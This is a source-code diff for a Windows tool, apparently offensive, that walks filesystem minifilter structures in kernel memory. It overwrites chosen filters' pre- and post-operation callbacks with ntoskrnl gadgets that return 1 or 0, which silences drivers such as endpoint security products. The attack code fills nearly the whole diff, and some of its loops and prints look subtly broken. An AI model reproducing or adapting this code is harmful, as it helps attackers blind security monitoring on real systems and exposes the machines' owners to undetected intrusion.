@@ -1,21 +1,5 @@
 #include "FltUtil.h"
 
-PFLT_FILTER GetFilterByName(const wchar_t* strFilterName)
-{
-	return PFLT_FILTER();
-}
-
-BOOL GetFilterOperationByMajorFn(PFLT_FILTER lpFilter, DWORD MajorFunction)
-{
-	return 0;
-}
-
-DWORD GetFrameCount()
-{
-	return 0;
-}
-
-
 PVOID FltManager::ResolveDriverBase(const wchar_t* strDriverName)
 {
 	DWORD szBuffer = 0x2000;
@@ -106,19 +90,29 @@ PVOID FltManager::ResolveFltmgrGlobals(LPVOID lpkFltMgrBase)
 	return (PVOID)((SIZE_T)lpkFltEnumerateFilters + 7 + dwOffset - 0x58);
 }
 
-PVOID FltManager::FindRet1()
+BOOL FltManager::ResolveFunctionsForPatch(PHANDY_FUNCTIONS lpHandyFunctions)
 {
+	if (!lpHandyFunctions) {
+		return FALSE;
+	}
+	
 	LPVOID lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
-	printf("Ntos base %llx\n", lpNtosBase);
+	printf("Ntos base %llx\n", (DWORD64)lpNtosBase);
 	HMODULE hNtos = LoadLibraryExA(R"(C:\WINDOWS\System32\ntoskrnl.exe)", NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
 	if (!hNtos) {
 		puts("Could not load ntos");
-		return NULL;
+		return FALSE;
 	}
-
-	// fucking sue me
+	// sue me
 	LPVOID lpNtos = (LPVOID)((SIZE_T)hNtos & 0xFFFFFFFFFFFFFF00);
-	
+	_peb_ldr ldr = _peb_ldr(lpNtos);
+	lpHandyFunctions->FuncReturns1 = this->FindRet1(lpNtosBase, &ldr);
+	lpHandyFunctions->FuncReturns0 = this->FindRet0(lpNtosBase, &ldr);
+	return lpHandyFunctions->FuncReturns0 && lpHandyFunctions->FuncReturns1;
+}
+
+PVOID FltManager::FindRet1(LPVOID lpNtosBase, _ppeb_ldr ldr)
+{
 	INT32 dwOffset = 0;
 	PUCHAR lpData = 0;
 	BOOL bFound = FALSE;
@@ -128,12 +122,9 @@ PVOID FltManager::FindRet1()
 		0xc3 // ret
 	};
 
-	_peb_ldr ldr = _peb_ldr(lpNtos);
-
-	PBYTE lpKeIsEmptyAffinityEx = (PBYTE)ldr.get(cexpr_adler32("KeIsEmptyAffinityEx"));
+	PBYTE lpKeIsEmptyAffinityEx = (PBYTE)ldr->get(cexpr_adler32("KeIsEmptyAffinityEx"));
 	if (!lpKeIsEmptyAffinityEx) {
 		puts("Couldn't find KeIsEmptyAffinityEx");
-		FreeLibrary(hNtos);
 		return NULL;
 	}
 
@@ -149,12 +140,44 @@ PVOID FltManager::FindRet1()
 		}
 	}
 
-	SIZE_T func_offset = (SIZE_T)lpKeIsEmptyAffinityEx - (SIZE_T)lpNtos;
+	SIZE_T func_offset = (SIZE_T)lpKeIsEmptyAffinityEx - (SIZE_T)ldr->base;
 	SIZE_T ret_offset = lpData - lpKeIsEmptyAffinityEx;
-	FreeLibrary(hNtos);
 	return (PVOID)((SIZE_T)lpNtosBase + func_offset + ret_offset);
 }
 
+PVOID FltManager::FindRet0(LPVOID lpNtosBase, _ppeb_ldr ldr)
+{
+	INT32 dwOffset = 0;
+	PUCHAR lpData = 0;
+	BOOL bFound = FALSE;
+
+	UCHAR ucharRet1[3] = {
+		0x33,0xc0, // xor eax, eax
+		0xc3 // ret
+	};
+
+	PBYTE lpKeCheckProcessorAffinityEx = (PBYTE)ldr->get(cexpr_adler32("KeCheckProcessorAffinityEx"));
+	if (!lpKeCheckProcessorAffinityEx) {
+		puts("Couldn't find KeCheckProcessorAffinityEx");
+		return NULL;
+	}
+
+	for (SIZE_T i = 0; i < 0x200; i++) {
+		for (SIZE_T j = 0; j < 0x200 + j; j++) {
+			if (lpKeCheckProcessorAffinityEx[j + i] != ucharRet1[j]) {
+				break;
+			}
+			else if (j + 1 == sizeof(ucharRet1)) {
+				bFound = TRUE;
+				lpData = lpKeCheckProcessorAffinityEx + i;
+			}
+		}
+	}
+
+	SIZE_T func_offset = (SIZE_T)lpKeCheckProcessorAffinityEx - (SIZE_T)ldr->base;
+	SIZE_T ret_offset = lpData - lpKeCheckProcessorAffinityEx;
+	return (PVOID)((SIZE_T)lpNtosBase + func_offset + ret_offset);
+}
 
 FltManager::FltManager(MemHandler* objMemHandlerArg)
 {
@@ -239,21 +262,22 @@ PVOID FltManager::GetFilterByName(const wchar_t* strFilterName)
 		}
 		printf("Found %d filters for frame\n", ulFiltersInFrame);
 		
-		b = this->objMemHandler->VirtualRead(
-			lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_FILTER_LISTHEAD,
-			&qwFrameListHead,
-			sizeof(DWORD64)
-		);
-
-		if (!b) {
-			puts("Failed to read frame list head!");
-			return NULL;
-		}
-
-		
-		qwFrameListIter = qwFrameListHead;
+		// set the list iter to the head of the list
+		qwFrameListIter = lpFltFrame + FLT_FRAME_OFFSET_FILTER_RESOUCE_LISTHEAD + FILTER_RESOUCE_LISTHEAD_OFFSET_FILTER_LISTHEAD;
 
 		for (ULONG j = 0; j < ulFiltersInFrame; j++) {
+			// read the flink
+			b = this->objMemHandler->VirtualRead(
+				qwFrameListIter,
+				&qwFrameListIter,
+				sizeof(DWORD64)
+			);
+
+			if (!b) {
+				puts("Failed to read frame list head!");
+				return NULL;
+			}
+
 			DWORD64 qwFilterName = 0;
 			DWORD64 qwFilterNameBuffPtr = 0;
 			USHORT Length = 0;
@@ -384,8 +408,6 @@ std::vector<FLT_OPERATION_REGISTRATION> FltManager::GetOperationsForFilter(PVOID
 	return retVec;
 }
 
-
-
 std::unordered_map<wchar_t*, PVOID> FltManager::EnumFrameVolumes(LPVOID lpFrame)
 {
 	ULONG ulNumVolumes = 0;
@@ -460,7 +482,11 @@ DWORD FltManager::GetFrameCount()
 	return this->ulNumFrames;
 }
 
-BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERATION_REGISTRATION> vecTargetOperations, std::unordered_map<wchar_t*, PVOID> mapTargetVolumes, LPVOID lpFunctionTarget)
+BOOL FltManager::RemovePrePostCallbacksForVolumesAndCallbacks(
+	std::vector<FLT_OPERATION_REGISTRATION> vecTargetOperations, 
+	std::unordered_map<wchar_t*, PVOID> mapTargetVolumes, 
+	PHANDY_FUNCTIONS lpHandyFuncs
+)
 {
 	ULONG numPatched = 0;
 	for (const FLT_OPERATION_REGISTRATION &op : vecTargetOperations) {
@@ -499,15 +525,15 @@ BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERAT
 		*/
 		UCHAR index = (UCHAR)op.MajorFunction + 22;
 
-		// read the pointer to the volume's callback table
+
 		for (auto& vol : mapTargetVolumes) {
 			if (index > 50) {
 				printf("Skipping non-indexed adjusted major fn - %d", index);
 				continue;
 			}
 
-			DWORD64 lpTargetCallbackListEntryPtr = (DWORD64)vol.second + VOLUME_OFFSET_CALLBACK_TBL + (index * 0x10);
-			printf("\n==== MajFn - %d ListEntryPtr - %llx ====\n", index, lpTargetCallbackListEntryPtr);
+			DWORD64 lpTargetCallbackListEntryPtr = (DWORD64)vol.second + VOLUME_OFFSET_CALLBACK_TBL + ((DWORD64)index * 0x10);
+			printf("\n==== Volume: %S ====\n\tMajFn - %d\n\tListEntryPtr - %llx\n", vol.first, index, lpTargetCallbackListEntryPtr);
 			DWORD64 lpListHead = 0;
 			DWORD64 lpListIter = 0;
 
@@ -522,70 +548,40 @@ BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERAT
 			lpListIter = lpListHead;
 
 			do {
-				// read in the preop
-				DWORD64 lpPreOp = 0;
+				// read in the preop and post-op
+				// operations[0] = PreOp
+				// operations[1] = PostOp
+				DWORD64 operations[2] = { 0 };
 				bool b = this->objMemHandler->VirtualRead(
 					lpListIter + CALLBACK_NODE_OFFSET_PREOP,
-					&lpPreOp,
-					sizeof(DWORD64)
+					operations,
+					sizeof(operations)
 				);
 				if (!b) return FALSE;
 
-				if (lpPreOp == (DWORD64)op.PreOperation) {
-					printf("Callback is at : %llx\tval %llx\n", lpListIter + CALLBACK_NODE_OFFSET_PREOP, lpPreOp);
-					numPatched++;
-					puts("about to patch... press a key...");
-					getchar();
-
-					DWORD64 lpTarget = (DWORD64)lpFunctionTarget;
+				if (operations[0] == (DWORD64)op.PreOperation && op.PreOperation) {
+					printf("\tPre Callback is at : %llx\tval %llx\n", lpListIter + CALLBACK_NODE_OFFSET_PREOP, operations[0]);
+					DWORD64 lpTarget = (DWORD64)lpHandyFuncs->FuncReturns1;
 					b = this->objMemHandler->VirtualWrite(
 						lpListIter + CALLBACK_NODE_OFFSET_PREOP,
 						&lpTarget,
 						sizeof(DWORD64)
 					);
-
-					//DWORD64 lpPreviousNode = 0;
-					//DWORD64 lpNextNode = 0;
-
-					//// read this node's BLINK
-					//b = this->objMemHandler->VirtualRead(
-					//	lpListIter + 0x8,
-					//	&lpPreviousNode,
-					//	sizeof(DWORD64)
-					//);
-					//if (!b) return FALSE;
-
-					//// read this node's FLINK
-					//b = this->objMemHandler->VirtualRead(
-					//	lpListIter,
-					//	&lpNextNode,
-					//	sizeof(DWORD64)
-					//);
-					//if (!b) return FALSE;
-
-					//// write previous node's FLINK 
-					//b = this->objMemHandler->VirtualWrite(
-					//	lpPreviousNode,
-					//	&lpNextNode,
-					//	sizeof(DWORD64)
-					//);
-					//if (!b) return FALSE;
-
-					//// write the next node's BLINK
-					//b = this->objMemHandler->VirtualWrite(
-					//	lpNextNode + 0x8,
-					//	&lpPreviousNode,
-					//	sizeof(DWORD64)
-					//);
-					//if (!b) return FALSE;
-
-					//puts("++ Patched callback! ++");
-
-					//// if we're patching the list head
-					//if (lpListIter == lpListHead) {
-					//	// set the list head to the previous node to prevent a loop
-					//	lpListHead = lpPreviousNode;
-					//}
+					if (!b) return FALSE;
+					puts("\t\t** PATCHED!");
+					numPatched++;		
+				} 
+				if (operations[1] == (DWORD64)op.PostOperation && op.PostOperation != NULL) {
+					printf("\tPost Callback is at : %llx\tval %llx\n", lpListIter + CALLBACK_NODE_OFFSET_PREOP, operations[1]);
+					DWORD64 lpTarget = (DWORD64)lpHandyFuncs->FuncReturns1;
+					b = this->objMemHandler->VirtualWrite(
+						lpListIter + CALLBACK_NODE_OFFSET_POSTOP,
+						&lpTarget,
+						sizeof(DWORD64)
+					);
+					if (!b) return FALSE;
+					puts("\t\t** PATCHED");
+					numPatched++;
 				}
 
 				// read the next FLINK
